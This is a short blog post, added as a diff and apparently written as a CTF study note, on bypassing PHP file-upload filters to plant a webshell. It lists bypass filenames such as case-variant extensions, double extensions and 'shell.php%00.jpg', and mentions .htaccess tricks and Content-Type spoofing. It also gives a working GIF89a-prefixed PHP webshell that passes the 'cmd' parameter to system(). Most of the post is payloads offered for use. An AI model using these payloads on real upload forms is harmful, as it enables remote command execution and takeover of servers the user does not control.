@@ -1,0 +1,89 @@
+---
+layout: post
+title: "about php webshell"
+subtitle: "about php webshell upload bypass"
+date: 2020-11-22 17:20:24 -0400
+background: '/img/posts/06.jpg'
+---
+
+<p>
+    I always take a long time to write code whenever there is a webshell problem in CTF, it seems to be because I haven't studied webshell in detail.
+In this post, I will try to use a technique to bypass webshell upload filtering.
+</p>
+
+<hr>
+
+<p>
+    The first is a technique that bypasses checking the file extension.
+In this case, you can try the bypass as follows.
+</p>
+
+<strong> php phtml, .php, .php3, .php4, .php5, and .inc </strong> 
+<strong> shell.PhP shell.Php1 shell.PhP2 shell.pHP2 shell.pHp4 shell.PHp5 shell.PhtM </strong> 
+
+<p>
+    if filter check using idiotic regex you can try this <br>
+    <strong>shell.jpg.php</strong>
+</p>
+
+<hr>
+
+<p>
+    Add shell to excutable using .htaccess
+</p>
+
+<hr>
+
+<p>Bypassing the Extension White Listing</p>
+
+<ul>
+    <li>
+        1. Null Byte Injection
+        <p>
+            try like <strong>shell.php%00.jpg </strong> <br>
+        </p>
+    </li>
+    <li>
+        2. Bypass using Double extension
+        <p>
+            try like <strong>shell.php.jpg, shell.php:.jpg, shell.php;.jpg</strong>
+        </p>
+    </li>
+    <li>
+        3. Invalid Extension Bypass
+        <p>
+            try like <strong> shell.php.test </strong>
+            when we use extentions like .test which is not recognized by the operating system, then the first extension is used
+        </p>
+    </li>
+</ul>
+
+<hr>
+
+<p>
+    if the filter check about content of webshell <br>
+    how to bypass content / type verification
+</p>
+
+<ul>
+    <li>
+        1. Change content-type using request modification.
+        <p>You can see in the image, the content type is "application/octet-stream," change to "image/gif," and hope this works for you.</p>
+        
+    </li>
+    <li>
+        2. Fool server side check using GIF89a; header
+        <p>Sometimes server side content signature check can be fooled using "GIF89a;" header in your shell. So heres an example: </p>
+        <div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div><div style="line-height:130%">2</div><div style="line-height:130%">3</div><div style="line-height:130%">4</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%">GIF89a;</div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#ff3399">&lt;?</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">system(<span style="color:#066de2">$_GET</span>[<span style="color:#63a35c">'cmd'</span>]);<span style="color:#999999">//or&nbsp;you&nbsp;can&nbsp;insert&nbsp;your&nbsp;complete&nbsp;shell&nbsp;code</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#ff3399">?&gt;</span></div></div><div style="text-align:right;margin-top:-13px;margin-right:5px;font-size:9px;font-style:italic"><a href="http://colorscripter.com/info#e" target="_blank" style="color:#e5e5e5text-decoration:none">Colored by Color Scripter</a></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div>
+    </li>
+    <li>
+        3. Inject your payload in Image Metadata/Comment
+        <p>
+            <a href="https://pentesttools.net/pixload-image-payload-creating-injecting-tools/">https://pentesttools.net/pixload-image-payload-creating-injecting-tools/</a>
+        </p>
+    </li>
+</ul>
+
+<p>
+    The post was made by reference to <a href="http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html">http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html</a>
+</p>
